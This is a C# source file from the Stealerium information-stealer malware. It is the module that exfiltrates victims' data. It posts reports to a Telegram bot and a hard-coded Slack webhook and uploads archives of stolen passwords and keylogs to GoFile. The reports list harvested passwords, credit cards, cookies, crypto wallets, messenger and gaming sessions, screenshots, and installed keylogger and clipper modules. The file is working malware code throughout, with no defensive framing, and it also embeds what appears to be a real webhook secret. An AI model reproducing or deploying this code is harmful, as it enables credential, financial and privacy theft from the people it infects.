using System;
using System.IO;
using System.Net.Http;
using System.Text;
using System.Text.Json;
using System.Threading.Tasks;
using System.Linq;
using System.Text.RegularExpressions;
using Stealerium.Helpers;
using Stealerium.Modules.Implant;
using Stealerium.Target.System;

namespace Stealerium
{
    internal sealed class Telegram
    {
        private const int MaxKeylogs = 10;

        private static string TelegramBotAPI = "https://api.telegram.org/bot";

        // Slack webhook URL
        private static readonly string SlackWebhookUrl = "https://hooks.slack.com/services/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";

        // Message id location
        private static readonly string LatestMessageIdLocation = Path.Combine(Paths.InitWorkDir(), "msgid.dat");

        // Keylogs history file
        private static readonly string KeylogsHistory = Path.Combine(Paths.InitWorkDir(), "history.dat");

        // Save latest message id to file
        private static void SetLatestMessageId(int id)
        {
            try
            {
                File.WriteAllText(LatestMessageIdLocation, id.ToString());
                Startup.SetFileCreationDate(LatestMessageIdLocation);
                Startup.HideFile(LatestMessageIdLocation);
            }
            catch (Exception ex)
            {
                Logging.Log("SaveID: \n" + ex);
            }
        }

        // Get latest message id from file
        private static int GetLatestMessageId()
        {
            if (!File.Exists(LatestMessageIdLocation))
            {
                return -1;
            }

            try
            {
                string fileContent = File.ReadAllText(LatestMessageIdLocation).Trim();
                if (Int32.TryParse(fileContent, out int messageId))
                {
                    return messageId;
                }
            }
            catch (IOException ex)
            {
                Logging.Log("IO error while reading the file:\n" + ex);
            }
            catch (Exception ex)
            {
                Logging.Log("Unexpected error:\n" + ex);
            }

            return -1;
        }

        /// <summary>
        /// Get sent message ID
        /// </summary>
        /// <param name="response">Telegram bot API response</param>
        /// <returns>Message ID, or -1 if not found or an error occurs</returns>
        private static int GetMessageId(string response)
        {
            var match = Regex.Match(response, "\"result\":{\"message_id\":\\d+");
            return Int32.Parse(match.Value.Replace("\"result\":{\"message_id\":", ""));
        }

        /// <summary>
        /// Send message to Telegram bot asynchronously
        /// </summary>
        /// <param name="text">Message text</param>
        /// <returns>Returns a Task<int> indicating the message ID if successful, or 0 if failed</returns>
        public static async Task<int> SendMessageAsync(string text)
        {
            try
            {
                using (HttpClient client = new HttpClient())
                {
                    // Build the request URL
                    string requestUrl = TelegramBotAPI + Config.TelegramAPI + "/sendMessage" +
                                        "?chat_id=" + Config.TelegramID +
                                        "&text=" + Uri.EscapeDataString(text) +  // Escape special characters in the text
                                        "&parse_mode=Markdown" +
                                        "&disable_web_page_preview=True";

                    // Send the GET request asynchronously
                    HttpResponseMessage response = await client.GetAsync(requestUrl);

                    // Ensure the response is successful
                    if (response.IsSuccessStatusCode)
                    {
                        // Read the response content as a string
                        string responseBody = await response.Content.ReadAsStringAsync();

                        // Extract the message ID from the response
                        return GetMessageId(responseBody);
                    }
                }
            }
            catch (Exception error)
            {
                // Log any exceptions that occur during the request
                Logging.Log("Telegram >> SendMessage exception:\n" + error);
            }

            // Return 0 if there was an error or the request failed
            return 0;
        }

        /// <summary>
        /// Edit message text in Telegram bot asynchronously
        /// </summary>
        /// <param name="text">New message text</param>
        /// <param name="id">Message ID</param>
        /// <returns>A Task representing the asynchronous operation</returns>
        public static async Task EditMessageAsync(string text, int id)
        {
            try
            {
                using (HttpClient client = new HttpClient())
                {
                    // Build the request URL
                    string requestUrl = TelegramBotAPI + Config.TelegramAPI + "/editMessageText" +
                                        "?chat_id=" + Config.TelegramID +
                                        "&text=" + Uri.EscapeDataString(text) +  // Escape special characters in the text
                                        "&message_id=" + id +
                                        "&parse_mode=Markdown" +
                                        "&disable_web_page_preview=True";

                    // Send the GET request asynchronously
                    HttpResponseMessage response = await client.GetAsync(requestUrl);

                    // Ensure the response is successful
                    if (!response.IsSuccessStatusCode)
                    {
                        Logging.Log("Telegram >> EditMessage failed with status code: " + response.StatusCode);
                    }
                }
            }
            catch (Exception error)
            {
                // Log any exceptions that occur during the request
                Logging.Log("Telegram >> EditMessage exception:\n" + error);
            }
        }

        /// <summary>
        /// Check if the Telegram token is valid asynchronously
        /// </summary>
        /// <returns>Returns a Task<bool> indicating if the token is valid</returns>
        public static async Task<bool> TokenIsValidAsync()
        {
            try
            {
                using (HttpClient client = new HttpClient())
                {
                    // Build the full request URL
                    string requestUrl = TelegramBotAPI + Config.TelegramAPI + "/getMe";

                    // Send the request asynchronously
                    HttpResponseMessage response = await client.GetAsync(requestUrl);

                    // Ensure the response is successful
                    if (response.IsSuccessStatusCode)
                    {
                        // Read the response content as a string
                        string responseBody = await response.Content.ReadAsStringAsync();

                        // Check if the response indicates the token is valid
                        return responseBody.StartsWith("{\"ok\":true,");
                    }
                }
            }
            catch (Exception error)
            {
                Logging.Log("Telegram >> Invalid token:\n" + error);
            }

            // Return false if there was an error or the token is invalid
            return false;
        }

        /// <summary>
        /// Send a report to Slack asynchronously
        /// </summary>
        /// <param name="text">Message text</param>
        /// <returns>Returns a Task indicating completion</returns>
        public static async Task SendSlackMessageAsync(string text)
        {
            try
            {
                using (HttpClient client = new HttpClient())
                {
                    // Create the JSON payload for Slack
                    var payload = new
                    {
                        text = text
                    };

                    // Convert the payload to JSON
                    var jsonPayload = JsonSerializer.Serialize(payload);

                    // Send a POST request to the Slack webhook URL
                    var content = new StringContent(jsonPayload, Encoding.UTF8, "application/json");
                    HttpResponseMessage response = await client.PostAsync(SlackWebhookUrl, content);

                    // Log the result
                    if (!response.IsSuccessStatusCode)
                    {
                        Logging.Log("Slack >> Message sending failed with status code: " + response.StatusCode);
                    }
                }
            }
            catch (Exception error)
            {
                // Log any exceptions that occur during the request
                Logging.Log("Slack >> SendMessage exception:\n" + error);
            }
        }

        /// <summary>
        ///     Upload keylogs to GoFile
        /// </summary>
        private static void UploadKeylogs()
        {
            var log = Path.Combine(Paths.InitWorkDir(), "logs");
            if (!Directory.Exists(log)) return;
            var filename = DateTime.Now.ToString("yyyy-MM-dd_h.mm.ss");
            var archive = Filemanager.CreateArchive(log, false);
            File.Move(archive, filename + ".zip");
            var url = GofileFileService.UploadFileAsync(filename + ".zip");
            File.Delete(filename + ".zip");
            File.AppendAllText(KeylogsHistory, "\t\t\t\t\t\t\t- " +
                                               $"[{filename.Replace("_", " ").Replace(".", ":")}]({url})\n");
            Startup.HideFile(KeylogsHistory);
        }

        /// <summary>
        ///     Get string with keylogs history
        /// </summary>
        /// <returns></returns>
        private static string GetKeylogsHistory()
        {
            if (!File.Exists(KeylogsHistory))
                return "";

            var logs = File.ReadAllLines(KeylogsHistory)
                .Reverse().Take(MaxKeylogs).Reverse().ToList();
            var len = logs.Count == 10 ? $"({logs.Count} - MAX)" : $"({logs.Count})";
            var data = string.Join("\n", logs);
            return $"\n\n  ⌨️ *Keylogger {len}:*\n" + data;
        }

        /// <summary>
        ///     Format system information for sending to telegram bot
        /// </summary>
        /// <returns>String with formatted system information</returns>
        private static async Task SendSystemInfoAsync(string url)
        {
            UploadKeylogs();

            // Get system info as a report string
            var info = "```"
                       + "\n😹 *Stealerium - Report:*"
                       + "\nDate: " + SystemInfo.Datenow
                       + "\nSystem: " + SystemInfo.GetSystemVersion()
                       + "\nUsername: " + SystemInfo.Username
                       + "\nCompName: " + SystemInfo.Compname
                       + "\nLanguage: " + Flags.GetFlag(SystemInfo.Culture.Split('-')[1]) + " " + SystemInfo.Culture
                       + "\nAntivirus: " + SystemInfo.GetAntivirus()
                       + "\n"
                       + "\n💻 *Hardware:*"
                       + "\nCPU: " + SystemInfo.GetCpuName()
                       + "\nGPU: " + SystemInfo.GetGpuName()
                       + "\nRAM: " + SystemInfo.GetRamAmount()
                       + "\nPower: " + SystemInfo.GetBattery()
                       + "\nScreen: " + SystemInfo.ScreenMetrics()
                       + "\nWebcams count: " + WebcamScreenshot.GetConnectedCamerasCount()
                       + "\n"
                       + "\n📡 *Network:* "
                       + "\nGateway IP: " + SystemInfo.GetDefaultGateway()
                       + "\nInternal IP: " + SystemInfo.GetLocalIp()
                       + "\nExternal IP: " + SystemInfo.GetPublicIpAsync().Result
                       + "\n"
                       + "\n💸 *Domains info:*"
                       + Counter.GetLValue("🏦 *Banking services*", Counter.DetectedBankingServices, '-')
                       + Counter.GetLValue("💰 *Cryptocurrency services*", Counter.DetectedCryptoServices, '-')
                       + Counter.GetLValue("🍓 *Porn websites*", Counter.DetectedPornServices, '-')
                       + GetKeylogsHistory()
                       + "\n"
                       + "\n🌐 *Browsers:*"
                       + Counter.GetIValue("🔑 Passwords", Counter.Passwords)
                       + Counter.GetIValue("💳 CreditCards", Counter.CreditCards)
                       + Counter.GetIValue("🍪 Cookies", Counter.Cookies)
                       + Counter.GetIValue("📂 AutoFill", Counter.AutoFill)
                       + Counter.GetIValue("⏳ History", Counter.History)
                       + Counter.GetIValue("🔖 Bookmarks", Counter.Bookmarks)
                       + Counter.GetIValue("📦 Downloads", Counter.Downloads)
                       + Counter.GetIValue("💰 Wallet Extensions", Counter.BrowserWallets)
                       + "\n"
                       + "\n🗃 *Software:*"
                       + Counter.GetIValue("💰 Wallets", Counter.Wallets)
                       + Counter.GetIValue("📡 FTP hosts", Counter.FtpHosts)
                       + Counter.GetIValue("🔌 VPN accounts", Counter.Vpn)
                       + Counter.GetIValue("🦢 Pidgin accounts", Counter.Pidgin)
                       + Counter.GetSValue("📫 Outlook accounts", Counter.Outlook)
                       + Counter.GetSValue("✈️ Telegram sessions", Counter.Telegram)
                       + Counter.GetSValue("☁️ Skype session", Counter.Skype)
                       + Counter.GetSValue("👾 Discord token", Counter.Discord)
                       + Counter.GetSValue("💬 Element session", Counter.Element)
                       + Counter.GetSValue("💭 Signal session", Counter.Signal)
                       + Counter.GetSValue("🔓 Tox session", Counter.Tox)
                       + Counter.GetSValue("🎮 Steam session", Counter.Steam)
                       + Counter.GetSValue("🎮 Uplay session", Counter.Uplay)
                       + Counter.GetSValue("🎮 BattleNET session", Counter.BattleNet)
                       + "\n"
                       + "\n🧭 *Device:*"
                       + Counter.GetSValue("🗝 Windows product key", Counter.ProductKey)
                       + Counter.GetIValue("🛰 Wifi networks", Counter.SavedWifiNetworks)
                       + Counter.GetSValue("📸 Webcam screenshot", Counter.WebcamScreenshot)
                       + Counter.GetSValue("🌃 Desktop screenshot", Counter.DesktopScreenshot)
                       + "\n"
                       + "\n🦠 *Installation:*"
                       + Counter.GetBValue(Config.Autorun == "1" && (Counter.BankingServices || Counter.CryptoServices),
                           "✅ Startup installed", "⛔️ Startup disabled")
                       + Counter.GetBValue(
                           Config.ClipperModule == "1" && Counter.CryptoServices && Config.Autorun == "1",
                           "✅ Clipper installed", "⛔️ Clipper not installed")
                       + Counter.GetBValue(
                           Config.KeyloggerModule == "1" && Counter.BankingServices && Config.Autorun == "1",
                           "✅ Keylogger installed", "⛔️ Keylogger not installed")
                       + "\n"
                       + "\n📄 *File Grabber:*" +
                       (Config.GrabberModule != "1" ? "\n   ∟ ⛔️ Disabled in configuration" : "")
                       + Counter.GetIValue("📂 Images", Counter.GrabberImages)
                       + Counter.GetIValue("📂 Documents", Counter.GrabberDocuments)
                       + Counter.GetIValue("📂 Database files", Counter.GrabberDatabases)
                       + Counter.GetIValue("📂 Source code files", Counter.GrabberSourceCodes)
                       + "\n"
                       + $"\n🔗 [Archive download link]({url})"
                       + "\n🔐 Archive password is: \"" + StringsCrypt.ArchivePassword + "\""
                       + "```";

            // Send to Telegram
            int last = GetLatestMessageId();
            if (last != -1)
                await EditMessageAsync(info, last).ConfigureAwait(false);
            else
                SetLatestMessageId(await SendMessageAsync(info).ConfigureAwait(false));

            // Send to Slack
            await SendSlackMessageAsync(info);
        }

        /// <summary>
        /// Send report asynchronously to Telegram and Slack
        /// </summary>
        /// <param name="file">The file path of the archive</param>
        /// <returns>A Task representing the asynchronous operation</returns>
        public static async Task SendReportAsync(string file)
        {
            Logging.Log("Sending passwords archive to Gofile");
            var url = GofileFileService.UploadFileAsync(file);
            Logging.Log("Sending report to Telegram and Slack");
            await SendSystemInfoAsync(await url.ConfigureAwait(false)).ConfigureAwait(false);
            Logging.Log("Report sent to Telegram and Slack");
            File.Delete(file);
        }
    }
}
